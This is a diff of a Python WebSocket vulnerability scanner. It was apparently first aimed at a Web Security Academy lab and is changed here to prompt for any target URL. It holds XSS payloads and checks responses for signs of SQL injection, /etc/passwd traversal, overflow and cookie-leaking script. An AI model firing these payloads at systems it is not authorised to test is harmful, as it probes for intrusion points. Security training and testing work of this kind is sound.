@@ -1,7 +1,6 @@
 import asyncio
 import websockets
 
-# List of payloads to test various WebSocket vulnerabilities
 payloads = [
     '{"message": "test_payload"}',                             # Basic test payload
     '{"message": "<img src=1 onerror=\'alert(1)\'>"}',         # XSS payload
@@ -13,50 +12,105 @@ payloads = [
     '{"message": "<svg/onload=alert(1)>"}',                    # Another XSS payload
 ]
 
+def transform_url_to_ws(url):
+    """
+    Transforms an HTTP/HTTPS URL to a WebSocket URL.
+    
+    Args:
+        url (str): The URL to transform.
+    
+    Returns:
+        str: The transformed WebSocket URL.
+    
+    Raises:
+        ValueError: If the URL scheme is not http or https.
+    """
+    if url.startswith("https://"):
+        return url.replace("https://", "wss://", 1)
+    elif url.startswith("http://"):
+        return url.replace("http://", "ws://", 1)
+    else:
+        raise ValueError("Invalid URL scheme. URL must start with http:// or https://")
+
 async def send_payload(websocket, payload):
+    """
+    Sends a payload to a WebSocket and receives the response.
+    
+    Args:
+        websocket (websockets.WebSocketClientProtocol): The WebSocket connection.
+        payload (str): The payload to send.
+    
+    Returns:
+        tuple: The sent payload and the received response, or None if an error occurs.
+    """
     try:
         await websocket.send(payload)
         response = await websocket.recv()
-        return response
+        return payload, response
     except Exception as e:
         print(f"Error sending payload: {e}")
+        return payload, None
+
+async def analyze_response(payload, response):
+    """
+    Analyzes a WebSocket response for potential vulnerabilities.
+    
+    Args:
+        payload (str): The sent payload.
+        response (str): The received response.
+    
+    Returns:
+        str: A message indicating the detected vulnerability, or None if no vulnerability is detected.
+    """
+    if response is None:
         return None
 
-async def analyze_response(response):
-    # Simple analysis to detect if any vulnerability is triggered
     if "<img src=1 onerror='alert(1)'>" in response or "alert(1)" in response:
-        print("Potential XSS vulnerability detected!")
+        return f"Potential XSS vulnerability detected with payload: {payload}"
     elif "' OR 1=1 --" in response:
-        print("Potential SQL Injection vulnerability detected!")
+        return f"Potential SQL Injection vulnerability detected with payload: {payload}"
     elif "/etc/passwd" in response:
-        print("Potential Directory Traversal vulnerability detected!")
+        return f"Potential Directory Traversal vulnerability detected with payload: {payload}"
     elif "A" * 1000 in response:
-        print("Potential Buffer Overflow vulnerability detected!")
+        return f"Potential Buffer Overflow vulnerability detected with payload: {payload}"
     elif "console.log(document.cookie)" in response:
-        print("Potential Script Injection detected!")
+        return f"Potential Script Injection detected with payload: {payload}"
     elif "{\"username\": \"admin\"}" in response:
-        print("Potential JSON Injection detected!")
+        return f"Potential JSON Injection detected with payload: {payload}"
     elif "<svg/onload=alert(1)>" in response:
-        print("Potential XSS vulnerability detected!")
-    # Add more sophisticated analysis as needed
+        return f"Potential XSS vulnerability detected with payload: {payload}"
+    return None
 
 async def test_websocket(url):
-    results = []
+    """
+    Tests a WebSocket URL with various payloads to detect potential vulnerabilities.
+    
+    Args:
+        url (str): The WebSocket URL to test.
+    
+    Returns:
+        list: A list of results indicating detected vulnerabilities.
+    """
+    results = []  # Define results as a local variable
     try:
         async with websockets.connect(url) as websocket:
             for payload in payloads:
-                response = await send_payload(websocket, payload)
-                if response:
-                    print(f"Sent: {payload}")
-                    print(f"Received: {response}")
-                    result = await analyze_response(response)
-                    if result:
-                        results.append(result)
+                print(f"Sending payload: {payload}")  
+                sent_payload, response = await send_payload(websocket, payload)
+                print(f"Received response: {response}")  
+                result = await analyze_response(sent_payload, response)
+                if result:
+                    results.append(result)
                 await asyncio.sleep(1)  # Short delay between payloads
     except Exception as e:
         print(f"Error: {e}")
-    return results
+    finally:
+        return results
 
 if __name__ == "__main__":
-    url = "wss://0af2009a03e2320381f1bbdc004e0058.web-security-academy.net/chat"  # Replace with the target WebSocket URL
-    asyncio.run(test_websocket(url))
+    target_url = input("Enter the WebSocket URL to test for vulnerabilities: ")
+    ws_url = transform_url_to_ws(target_url)
+    results = asyncio.run(test_websocket(ws_url))
+    
+    for result in results:
+        print(result)
